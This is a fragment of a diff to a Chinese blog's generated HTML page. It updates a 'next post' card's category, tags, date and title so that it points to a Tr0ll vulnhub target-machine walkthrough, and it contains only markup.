                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/" class="post-category">
-                                    服务器
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/">
-                        <span class="chip bg-color">服务器</span>
+                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                        <span class="chip bg-color">渗透测试</span>
                     </a>
                     
-                    <a href="/tags/Linux/">
-                        <span class="chip bg-color">Linux</span>
+                    <a href="/tags/vulnhub/">
+                        <span class="chip bg-color">vulnhub</span>
+                    </a>
+                    
+                    <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                        <span class="chip bg-color">靶机</span>
                     </a>
                     
                 </div>
@@ -1127,13 +1188,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/6547.html">
+                <a href="/posts/5602.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/loading.gif" data-original="/medias/featureimages/10.jpg" class="responsive-img" alt="数据结构与算法中的排序算法(一)">
+                        <img src="/medias/loading.gif" data-original="/medias/featureimages/5.jpg" class="responsive-img" alt="Tr0ll靶机详解">
                         
-                        <span class="card-title">数据结构与算法中的排序算法(一)</span>
+                        <span class="card-title">Tr0ll靶机详解</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1144,14 +1205,14 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-31
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/" class="post-category">
-                                    数据结构与算法
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
                                 </a>
                             
                             
@@ -1161,12 +1222,16 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/python/">
-                        <span class="chip bg-color">python</span>
+                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                        <span class="chip bg-color">渗透测试</span>
                     </a>
                     
-                    <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/">
-                        <span class="chip bg-color">数据结构与算法</span>
+                    <a href="/tags/vulnhub/">
+                        <span class="chip bg-color">vulnhub</span>
+                    </a>
+                    
+                    <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                        <span class="chip bg-color">靶机</span>
                     </a>
                     
                 </div>
